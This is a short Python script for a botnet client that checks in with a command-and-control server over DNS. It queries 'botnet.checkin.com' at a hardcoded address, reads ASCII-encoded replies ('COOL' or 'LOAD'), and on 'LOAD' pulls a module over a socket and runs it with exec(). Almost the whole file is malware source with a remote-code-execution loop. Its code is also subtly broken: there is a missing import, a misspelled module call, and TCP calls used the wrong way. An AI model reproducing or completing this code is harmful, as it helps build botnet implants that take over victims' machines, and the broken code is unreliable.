import dnslib
import socket
import time
import os
import subprocess
import threading

def loadModule(modBytes):

    loadedModule = imp.ew_module('loadedModule')

    exec(modBytes, loadedModule.__dict__)

    loadedModule.shellModule()


d = dnslib.DNSRecord.question("botnet.checkin.com")
serverAddressPort   = ("192.168.48.137", 53)

UDPClientSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)


while True:
    UDPClientSocket.sendto(d.pack(), serverAddressPort)
    response, addr = UDPClientSocket.recvfrom(1024)

    dnsResponse = dnslib.DNSRecord.parse(response.strip())

    if "67.79.79.76" in str(dnsResponse.rr[0]):
        #checked in, just wait and loop again
        time.sleep(60)
        continue
    elif "76.79.65.68" in str(dnsResponse.rr[0]):
        ## open tcp socket to get module and load it
        port = str(dnsResponse.rr[1]).split()[-1]

        modTcpSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
        addr = ('localhost', port)
        modTcpSocket.bind(addr)

        moduleDirty = modTcpSocket.recvfrom(1024)
        modTcpSocket.close()
        module = moduleDirty.strip()

        threading.Thread(target=loadModule, args=(module)).start()
        continue
    else:
        ## unexpected result - just wait and try again
        time.sleep(60)
        continue
